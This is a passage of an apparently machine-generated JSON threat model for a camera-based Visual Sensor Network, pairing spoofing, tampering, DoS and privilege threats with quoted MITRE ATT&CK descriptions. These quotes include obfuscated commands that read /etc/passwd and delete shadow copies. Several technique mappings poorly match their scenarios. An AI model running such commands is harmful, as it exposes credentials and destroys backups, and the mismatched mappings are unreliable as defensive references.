                "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
                "technique_id": "T1014"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters visual data during transmission between camera nodes and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption",
                    "Role": "Network Architect",
                    "Condition": "Transmission lacks encryption"
                },
                {
                    "Assumption": "Camera nodes communicate over insecure channels",
                    "Role": "System Designer",
                    "Condition": "Use of unsecured communication protocols"
                },
                {
                    "Assumption": "There is no integrity verification for data packets",
                    "Role": "Network Engineer",
                    "Condition": "Lack of integrity checks"
                }
            ],
            "Potential Impact": "Integrity of visual data compromised, leading to unreliable system outputs.",
            "MITRE ATT&CK Keywords": [
                "network",
                "data manipulation",
                "interception",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker uses a deserialization vulnerability to inject malicious payloads into the VSN's software components.",
            "Assumptions": [
                {
                    "Assumption": "Software is vulnerable to deserialization attacks",
                    "Role": "Software Developer",
                    "Condition": "Use of insecure deserialization practices"
                },
                {
                    "Assumption": "No input validation on deserialized data",
                    "Role": "Security Analyst",
                    "Condition": "Lack of validation mechanisms"
                },
                {
                    "Assumption": "Attack surface accessible via network",
                    "Role": "Network Administrator",
                    "Condition": "Exposed attack vectors"
                }
            ],
            "Potential Impact": "Compromise of system integrity and potential unauthorized control over system components.",
            "MITRE ATT&CK Keywords": [
                "deserialization",
                "code injection",
                "input validation failure"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious insider modifies logs to cover tracks after unauthorized data access.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not immutable",
                    "Role": "System Admin",
                    "Condition": "Log tampering possible"
                },
                {
                    "Assumption": "Insufficient audit controls",
                    "Role": "Security Officer",
                    "Condition": "Lack of strict audit trails"
                },
                {
                    "Assumption": "Access control policies are lax",
                    "Role": "Policy Maker",
                    "Condition": "Weak access policies"
                }
            ],
            "Potential Impact": "Loss of data integrity and inability to trace unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "log manipulation",
                "audit logs",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker uses an external command injection vulnerability to execute unauthorized operations without leaving traces.",
            "Assumptions": [
                {
                    "Assumption": "External commands are executed with elevated privileges",
                    "Role": "System Architect",
                    "Condition": "Commands run as privileged user"
                },
                {
                    "Assumption": "No logging of command execution",
                    "Role": "System Admin",
                    "Condition": "Log monitoring disabled"
                },
                {
                    "Assumption": "Vulnerability in exposed web services",
                    "Role": "Web Developer",
                    "Condition": "External services are vulnerable"
                }
            ],
            "Potential Impact": "Integrity of data and systems compromised, inability to track unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "command injection",
                "privilege escalation",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disabling Security Tools",
                "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.",
                "id": "attack-pattern--2e0dd10b-676d-4964-acd0-8a404c92b044",
                "technique_id": "T1089"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker gains access to administrative functions and erases log files to prevent detection.",
            "Assumptions": [
                {
                    "Assumption": "Access to logging systems is not restricted",
                    "Role": "Security Analyst",
                    "Condition": "Log system permissions are lax"
                },
                {
                    "Assumption": "Lack of log retention policies",
                    "Role": "Compliance Officer",
                    "Condition": "No enforced log retention"
                },
                {
                    "Assumption": "Monitoring systems are inactive",
                    "Role": "Network Administrator",
                    "Condition": "Monitoring systems not fully operational"
                }
            ],
            "Potential Impact": "Loss of data integrity and inability to perform forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "log deletion",
                "administrative access",
                "forensic evasion"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits an XXE vulnerability to read sensitive files on the server.",
            "Assumptions": [
                {
                    "Assumption": "Application uses XML parsers vulnerable to XXE",
                    "Role": "Developer",
                    "Condition": "Insecure XML handling"
                },
                {
                    "Assumption": "Sensitive files are accessible by the application",
                    "Role": "System Admin",
                    "Condition": "Improper file access control"
                },
                {
                    "Assumption": "Network perimeter is not secured",
                    "Role": "Network Security Engineer",
                    "Condition": "Exploitation path available"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "xxe",
                "file read",
                "information disclosure",
                "xml parsing"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker performs directory traversal to access confidential configurations.",
            "Assumptions": [
                {
                    "Assumption": "Web server is vulnerable to directory traversal",
                    "Role": "Web Developer",
                    "Condition": "Improper input filtering"
                },
                {
                    "Assumption": "Access controls on directories are insufficient",
                    "Role": "System Admin",
                    "Condition": "Weak directory permissions"
                },
                {
                    "Assumption": "Application runs with high privileges",
                    "Role": "Penetration Tester",
                    "Condition": "Application misconfiguration"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive configuration data.",
            "MITRE ATT&CK Keywords": [
                "directory traversal",
                "configuration access",
                "input validation"
            ],
            "mitre_technique": {
                "name": "Command Obfuscation",
                "description": "Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)",
                "id": "attack-pattern--d511a6f6-4a33-41d5-bc95-c343875d1377",
                "technique_id": "T1027.010"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted visual data between camera nodes and analysis servers.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted",
                    "Role": "Network Architect",
                    "Condition": "No encryption on data channels"
                },
                {
                    "Assumption": "Attacker has access to the network",
                    "Role": "Security Officer",
                    "Condition": "Weak network security controls"
                },
                {
                    "Assumption": "No use of secure communication protocols",
                    "Role": "System Designer",
                    "Condition": "Insecure protocol implementation"
                }
            ],
            "Potential Impact": "Unauthorized access and potential manipulation of visual data.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "network access",
                "unencrypted communication"
            ],
            "mitre_technique": {
                "name": "Network Trust Dependencies",
                "description": "Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "id": "attack-pattern--36aa137f-5166-41f8-b2f0-a4cfa1b4133e",
                "technique_id": "T1590.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses a DDoS attack to overwhelm the central server, disrupting the VSN operations.",
            "Assumptions": [
                {
                    "Assumption": "Central server is internet-facing",
                    "Role": "System Architect",
                    "Condition": "Server accessible from the internet"
                },
                {
                    "Assumption": "Insufficient DDoS protection mechanisms",
                    "Role": "Security Engineer",
                    "Condition": "No DDoS mitigation strategies"
                },
                {
                    "Assumption": "Camera nodes and users rely on real-time data processing",
                    "Role": "System User",
                    "Condition": "Real-time data dependency"
                }
            ],
            "Potential Impact": "Disruption of system availability and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "ddos",
                "service disruption",
                "availability",
                "network saturation"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits an out-of-bounds write vulnerability in the Linux kernel to crash the camera node.",
            "Assumptions": [
                {
                    "Assumption": "Camera node uses vulnerable Linux kernel version",
                    "Role": "System Admin",
                    "Condition": "Kernel not patched"
                },
                {
                    "Assumption": "Lack of kernel integrity monitoring",
                    "Role": "System Administrator",
                    "Condition": "No integrity checks in place"
                },
                {
                    "Assumption": "Attacker has network access",
                    "Role": "Network Security Engineer",
                    "Condition": "No network isolation"
                }
            ],
            "Potential Impact": "Loss of service availability and potential data corruption.",
            "MITRE ATT&CK Keywords": [
                "kernel",
                "oob write",
                "crash",
                "network access"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker utilizes shell metacharacter injection to cause a denial of service by executing arbitrary commands.",
            "Assumptions": [
                {
                    "Assumption": "Application is vulnerable to shell metacharacter injection",
                    "Role": "Developer",
                    "Condition": "Insecure input handling"
                },
                {
                    "Assumption": "Command execution has high privileges",
                    "Role": "System Engineer",
                    "Condition": "High privilege execution context"
                },
                {
                    "Assumption": "Network access is not restricted",
                    "Role": "Security Officer",
                    "Condition": "Exposure of vulnerable service"
                }
            ],
            "Potential Impact": "Compromised data integrity and availability due to rogue command execution.",
            "MITRE ATT&CK Keywords": [
                "shell injection",
                "command execution",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Indirect Command Execution",
                "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",
                "id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e",
                "technique_id": "T1202"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a deserialization vulnerability to execute code with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Use of vulnerable deserialization routines",
                    "Role": "Developer",
                    "Condition": "Insecure deserialization usage"
                },
                {
                    "Assumption": "Processes run with elevated privileges",
                    "Role": "System Architect",
                    "Condition": "High privilege processes"
                },
                {
                    "Assumption": "Lack of input validation and sanitization",
                    "Role": "Security Engineer",
                    "Condition": "Relying on untrusted input"
                }
            ],
            "Potential Impact": "Compromise of system integrity and potential unauthorized control over nodes.",
            "MITRE ATT&CK Keywords": [
                "deserialization",
                "code execution",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Exploitation for Client Execution",
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
                "technique_id": "T1203"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker takes advantage of a directory traversal vulnerability to gain elevated access by modifying sensitive files.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerable web application allowing directory traversal",
                    "Role": "Web Developer",
                    "Condition": "Lack of input validation"
                },
                {
                    "Assumption": "Web server permissions are misconfigured",
                    "Role": "System Admin",
                    "Condition": "Insecure web server configuration"
                },
                {
                    "Assumption": "Access controls are insufficient",
                    "Role": "Security Officer",
                    "Condition": "Weak access policies"
                }
            ],
            "Potential Impact": "Unauthorized access and control over system components leading to data and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "directory traversal",
                "file modification",
                "access control"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider uses an AMD \u03bcProf driver vulnerability to escalate privileges.",
            "Assumptions": [
                {
                    "Assumption": "Driver allows low privilege users to access MSRs in kernel",
                    "Role": "System Admin",
                    "Condition": "Driver not updated"
                },
                {
                    "Assumption": "Lack of monitoring for privileged operations",
                    "Role": "Security Analyst",
                    "Condition": "No monitoring of kernel access"
                },
                {
                    "Assumption": "Insufficient separation of user roles",
                    "Role": "Compliance Officer",
                    "Condition": "Weak role separation policies"
                }
            ],
            "Potential Impact": "Unauthorized control and potential system compromise via ring-0 code execution.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "kernel access",
                "insider threat",
                "driver"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "21",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerading as a legitimate node in the Visual Sensor Network (VSN) to capture and intercept visual data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can establish a network connection to the VSN.",
                    "Role": "Attacker",
                    "Condition": "Attacker has network access capabilities."
                },
                {
                    "Assumption": "There is no robust authentication mechanism between nodes.",
                    "Role": "Application",
                    "Condition": "Application lacks strong authentication controls for nodes."
                },
                {
                    "Assumption": "The VSN does not monitor for anomalies in node identifiers or communication patterns.",
                    "Role": "Application",
                    "Condition": "Application does not have anomaly detection systems in place."
                }
            ],
            "Potential Impact": "Potential loss of data confidentiality and interception of sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network connection",
                "node masquerading",
                "data interception"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary uses a compromised camera node to feed fake visual data into the system.",
            "Assumptions": [
                {
                    "Assumption": "One or more camera nodes can be physically or remotely compromised.",
                    "Role": "Attacker",
                    "Condition": "Some nodes lack physical or remote security controls."
                },
                {
                    "Assumption": "The system does not verify the authenticity of visual data sources.",
                    "Role": "Application",
                    "Condition": "Application does not check source authenticity."
                },
                {
                    "Assumption": "Security patches and firmware updates are not applied in a timely manner.",
                    "Role": "Application",
                    "Condition": "Application is not up-to-date with security updates."
                }
            ],
            "Potential Impact": "Corruption of data integrity due to insertion of false visual data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "compromised node",
                "fake data injection",
                "system integrity"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
